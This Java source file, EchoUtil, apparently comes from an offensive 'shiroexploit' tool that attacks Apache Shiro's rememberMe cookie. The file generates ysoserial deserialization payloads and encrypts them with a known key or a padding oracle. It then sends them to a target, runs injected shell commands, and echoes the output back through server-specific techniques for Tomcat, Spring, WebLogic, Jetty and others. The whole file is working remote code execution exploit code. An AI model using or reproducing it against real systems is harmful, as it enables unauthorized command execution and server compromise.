package com.shiroexploit.util;

import com.shiroexploit.core.AesEncrypt;
import com.shiroexploit.core.PaddingOracle;
import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class EchoUtil {
    private static String staticFilePath;

    public static String getEchoResult(String key, PayloadType payloadType, String cmd, EchoType echoType){
        String result;

        switch (echoType.getName()){
            case "springEcho1":
            case "springEcho2":
            case "tomcat6Echo":
            case "Tomcat7_8Echo":
            case "tomcat9Echo":
            case "weblogicEcho1":
            case "resinEcho":
            case "jettyEcho":
            case "autoFindRequestEcho":
                result = getEchoResultWithGeneralMethodTypeA(key, payloadType, cmd, echoType);
                break;
            case "linuxEcho":
            case "windowsEcho":
            case "weblogicEcho2":
                result = getEchoResultWithGeneralMethodTypeB(key, payloadType, cmd, echoType);
                break;
            case "writeFileEcho":
                result = getEchoResultWithWriteFileMethod(key, payloadType, cmd, echoType);
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + echoType.getName());
        }

        return result;
    }

    public static List<EchoType> getValidEchoType(String key, PayloadType payloadType){
        List<EchoType> list = new ArrayList<>();
        
        List<String> list1 = new ArrayList<>();
        list1.add("springEcho1");
        list1.add("springEcho2");
        list1.add("tomcat6Echo");
        list1.add("Tomcat7_8Echo");
        list1.add("tomcat9Echo");
        list1.add("weblogicEcho1");
        list1.add("resinEcho");
        list1.add("jettyEcho");


        for(EchoType echoType : EchoType.values()) {
            System.out.println("[*] Trying " + echoType.getName());

            String flagText = "feihong" + System.currentTimeMillis();
            String cmd = "echo \"" + flagText + "\"";

            String result = null;
            if(echoType.getName().equals("autoFindRequestEcho")){
                writeClass(key, payloadType);

                try {
                    Thread.sleep(5000);

                    for(int i = 0; i < 10; i++){
                        result = getEchoResultWithGeneralMethodTypeA(key, payloadType, cmd, echoType);

                        if(result.contains(flagText)){
                            break;
                        }

                        Thread.sleep(1000);
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }else if(echoType.getName().equals("writeFileEcho")){
                initializeStaticFilePath();
                result = getEchoResultWithWriteFileMethod(key, payloadType, cmd, echoType);
            }else if(list1.contains(echoType.getName())){
                result = getEchoResultWithGeneralMethodTypeA(key, payloadType, cmd, echoType);
            }else if(echoType.getName().equals("weblogicEcho2")){
                result = getEchoResultWithGeneralMethodTypeB(key, payloadType, cmd, echoType);
            }else if(echoType.getName().equals("windowsEcho") || echoType.getName().equals("linuxEcho")){
                for(int i = 0; i < 10; i++){
                    result = getEchoResultWithGeneralMethodTypeB(key, payloadType, cmd, echoType);

                    if(result.contains(flagText)){
                        break;
                    }

                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }else{
                throw new IllegalStateException("Unexpected value: " + echoType.getName());
            }

            if(result.contains(flagText)){
                list.add(echoType);
            }
        }

        return list;
    }

    public static String getEchoResultWithGeneralMethodTypeA(String key, PayloadType payloadType, String cmd, EchoType echoType){
        String command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + payloadType.getName()
                + " directive:" + echoType.getName();
        byte[] payload = Tools.exec(command);

        String rememberMe = null;
        if(Config.getInstance().getVulType() == 0){
            rememberMe = AesEncrypt.encrypt(key, payload);
        }else{
            PaddingOracle paddingOracle = new PaddingOracle(Config.getInstance().getRequestInfo(), payload);
            try {
                rememberMe = paddingOracle.encrypt();
            } catch (ExploitFailedException e) {
                e.printStackTrace();
            }
        }

        System.out.println("[*] directive:" + echoType.getName() + " Cookie Length: " + rememberMe.length());

        HttpRequestInfo httpRequestInfo = Config.getInstance().getRequestInfo();
        httpRequestInfo.getHeaders().put("cmd", cmd);
        String result = HttpRequest.request(httpRequestInfo, rememberMe);
        if(result != null){
            return result.trim();
        }else{
            return "";
        }
    }

    public static String getEchoResultWithGeneralMethodTypeB(String key, PayloadType payloadType, String cmd, EchoType echoType){
        String command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + payloadType.getName()
                + " directive:" + echoType.getName() + ":" + cmd;
        byte[] payload = Tools.exec(command);

        String rememberMe = null;
        if(Config.getInstance().getVulType() == 0){
            rememberMe = AesEncrypt.encrypt(key, payload);
        }else{
            PaddingOracle paddingOracle = new PaddingOracle(Config.getInstance().getRequestInfo(), payload);
            try {
                rememberMe = paddingOracle.encrypt();
            } catch (ExploitFailedException e) {
                e.printStackTrace();
            }
        }

        System.out.println("[*] directive:" + echoType.getName() + ":" + cmd + " Cookie Length: " + rememberMe.length());
        String result = HttpRequest.request(Config.getInstance().getRequestInfo(), rememberMe);
        if(result != null){
            return result.trim();
        }else{
            return "";
        }
    }

    public static String getEchoResultWithWriteFileMethod(String key, PayloadType payloadType, String cmd, EchoType echoType){
        List<String> paths = Tools.getPaths(staticFilePath);

        for(String p : paths){
            String command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + payloadType.getName()
                    + " \"directive:" + echoType.getName() + ":" + p + ":" + cmd + "\"";
            byte[] payload = Tools.exec(command);

            String rememberMe = null;
            if(Config.getInstance().getVulType() == 0){
                rememberMe = AesEncrypt.encrypt(key, payload);
            }else{
                PaddingOracle paddingOracle = new PaddingOracle(Config.getInstance().getRequestInfo(), payload);
                try {
                    rememberMe = paddingOracle.encrypt();
                } catch (ExploitFailedException e) {
                    e.printStackTrace();
                }
            }

            System.out.println("[*] directive:" + echoType.getName() + ":" + p + ":" + cmd + " Cookie Length: " + rememberMe.length());
            HttpRequest.request(Config.getInstance().getRequestInfo(), rememberMe);
        }

        String content = "";
        try{
            Thread.sleep(1500);
            content = HttpRequest.getResponse(staticFilePath);
        }catch(Exception e){
            //pass
        }

        if(content != null){
            System.out.println("[+] You can see the result in:" + staticFilePath);
            return content;
        }else{
            return "";
        }
    }

    private static void writeClass(String key, PayloadType payloadType){
        for(int i = 1; i <=3 ; i++){
            String  command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + payloadType.getName()
                    + " directive:writeClass:" + i;
            byte[] payload = Tools.exec(command);

            String rememberMe = null;
            if(Config.getInstance().getVulType() == 0){
                rememberMe = AesEncrypt.encrypt(key, payload);
            }else{
                PaddingOracle paddingOracle = new PaddingOracle(Config.getInstance().getRequestInfo(), payload);
                try {
                    rememberMe = paddingOracle.encrypt();
                } catch (ExploitFailedException e) {
                    e.printStackTrace();
                }
            }

            System.out.println("[*] directive:writeClass:" + i + " Cookie Length: " + rememberMe.length());
            HttpRequest.request(Config.getInstance().getRequestInfo(), rememberMe);
        }
    }

    private static void initializeStaticFilePath(){
        URL url = null;
        try {
            url = new URL(Config.getInstance().getStaticFilePath());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        Random random = new Random();
        int rand = random.nextInt(10000);

        if(url.getPath().trim().equals("")){
            EchoUtil.staticFilePath = Config.getInstance().getStaticFilePath() + "/" + rand + ".js";
        }else{
            int index1 = staticFilePath.lastIndexOf("/");
            int index2 = staticFilePath.lastIndexOf("\\");
            int index = index1 > index2 ? index1 : index2;

            EchoUtil.staticFilePath = staticFilePath.substring(0, index) + "/" + rand + ".js";
        }
    }
}